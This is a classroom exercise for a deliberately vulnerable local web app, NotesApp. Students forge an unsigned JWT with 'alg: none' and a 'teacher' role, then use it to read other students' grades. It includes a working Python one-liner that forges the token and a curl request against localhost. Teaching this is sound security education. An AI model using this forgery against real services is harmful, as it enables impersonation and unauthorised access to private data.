# Exercise — Forge a token: become a teacher

**Your job:** make NotesApp believe you are a teacher, and read a grade that is not yours —
**without a password and without any key.** You only *break* it today. You fix it next class.
About 18 minutes, with your pair.

Work inside your `notesapp/` clone. Every command assumes you are in that folder.

!!! abstract "What you hand in — three lines, not a transcript"
    The deliverable is the **three-line finding** at the bottom: what you read, how, and why it
    worked. The commands are scaffolding — run them, or have AI drive them. What is yours is the
    grade you read and the sentence explaining why the server believed you.

!!! warning "Only your own app"
    You attack **only** your own NotesApp clone, on your own machine. That is the whole target.
    The technique is real; that is exactly why it only ever touches your own app here.

!!! question "Predict first — commit with your pair"
    You are about to send NotesApp a token with **no signature at all** — the part that is
    supposed to prove the server made it. **Will the server accept it?** Write down yes or no,
    and why, before you run anything.

---

## Start the app

```bash
docker compose up -d        # start db + web in the background
```

Open <http://localhost:8080> and log in as **`alice`** / **`alicepw`** (a student). Leave the
tab open — you are alice, a student, for the whole exercise.

---

## Step 1 — Look at the ticket you were given

When alice logged in, NotesApp handed her a JWT. Let's read it.

On the dashboard page, open the browser **DevTools console** (F12 → Console) and type:

```js
TOKEN
```

??? note "Can't see it? Read it from the page another way"
    The token is also printed into the page source. View source and search for `TOKEN`, or just
    skip ahead — you do **not** need alice's real token to forge one. You will build a token from
    scratch in Step 3.

Copy the string. It has three parts split by two dots: `header.payload.signature`. Paste it into
a decoder you run yourself — no website needed:

```bash
python3 - <<'PY'
import base64, json
tok = "PASTE_THE_TOKEN_HERE"
head, payload, sig = tok.split(".")
def d(s): return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
print("HEADER :", d(head))
print("PAYLOAD:", d(payload))
print("SIG    :", sig[:12], "...")
PY
```

!!! success "📏 Record — what is in the payload?"
    - What does the **payload** say your `role` is? ________
    - Was the payload **encrypted**, or could you read it straight away? ________

    You just read the inside of the token with no key. The payload is only **base64** — an
    encoding, not a lock. A JWT hides nothing; the signature only proves nobody *changed* it.

---

## Step 2 — The idea of the attack

The server reads the **header** to decide how to check the signature. The header is part of the
token. **You** write the token. So you get to write the instruction that tells the server how —
or whether — to check.

What if you set the header's algorithm to `"none"`? A broken server reads `"none"` and skips the
signature check completely. Then it trusts every word of your payload — including a `role` you
chose yourself.

That is the whole attack. Let's do it.

---

## Step 3 — Forge a teacher token

Build a token by hand: header says `alg: none`, payload says `role: teacher`, and the signature
is **left empty** (nothing after the last dot).

```bash
FORGED=$(python3 -c "import json,base64
b=lambda x: base64.urlsafe_b64encode(json.dumps(x).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'}) + '.' + b({'user_id':9999,'username':'attacker','role':'teacher'}) + '.')")
echo "$FORGED"
```

That `echo` shows your forged token. Notice it **ends with a dot** — the signature slot is empty.
Nobody signed this. You made it in one line.

---

## Step 4 — Read a grade that is not yours

Note **id 3** belongs to **bob**, not to alice. As alice in the browser you cannot see it. Send
your forged token to the API and ask for it anyway:

```bash
curl -H "Authorization: Bearer $FORGED" http://localhost:8080/api/notes/3
```

!!! success "📏 Record — what came back?"
    - Did you get bob's note, or an error? ________
    - What is **bob's grade**? ________  (expected: `12.6`)
    - What is **bob's comment**? ________

??? question "Done? Open this to debrief — not before"
    **Was your prediction right? Why did a token with no signature work?**

    ??? success "The answer"
        The server accepted it. Here is the chain:

        1. The server read the **header** to decide how to verify — and the header is part of the
           token *you* wrote.
        2. You wrote `"alg": "none"`, so the server skipped signature verification entirely.
        3. With no check, it believed the **payload** word for word — including `role: teacher`.

        No password. No key. No stolen cookie. You wrote the word *teacher* and told the server
        not to look. That is **flaw #4** in NotesApp — a forgeable token.

        (There is a second bug hiding here: even a *real* teacher token can read *any* student's
        note, because the API never checks who owns it. That is a different flaw — broken access
        control — for a later class. Today's bug is only that a **forged identity is trusted at
        all**.)

!!! tip "Try one more, if you have time"
    Change `/api/notes/3` to `/api/notes/4`, `/5`, `/6`… Each is a different student's grade.
    One forged token, the whole class's grades.

---

## What you hand in

Three lines. This is the finding:

```
FORGED-TOKEN FINDING — NotesApp flaw #4 (auth)
  What I read:   bob's grade (____) and comment, via /api/notes/3
  How:           a JWT with "alg":"none" and no signature; role set to "teacher"
  Why it worked: the server let the TOKEN choose how to verify, and I chose "don't"
```

---

## You do NOT fix it today

Next class (the lab) you close this for real, three ways:

1. **Reject `"none"`** — a token with no signature is never valid.
2. **Pin the algorithm** — the *server* decides it only accepts `HS256`; the token does not get
   a vote.
3. **Use a long random secret** — NotesApp's secret is `s3cr3t`, eight characters, guessable in
   seconds.

Bring today's forged token with you — you will watch each fix reject it.

---

## Cleanup

```bash
docker compose down     # your data lives in a volume and is kept
```

## Troubleshooting

??? bug "`curl` returns `{"error":"unauthorized"}`"
    The token did not parse. Re-run Step 3 exactly — the most common cause is a missing trailing
    dot (the empty signature) or a line break pasted into `$FORGED`. Run `echo "$FORGED"` and
    check it is one line ending in `.`

??? bug "`curl` returns `{"error":"not found"}`"
    That note id has no row. Try `/api/notes/1` through `/api/notes/10`. The token worked — the
    server accepted your forged identity; it just could not find that particular note.

??? bug "`python3: command not found`"
    Try `python`. On Windows without Python, run the two commands inside the web container:
    `docker compose exec web sh`, then use `python3` there (`curl` to `localhost:8080` still works
    from your host browser/terminal).
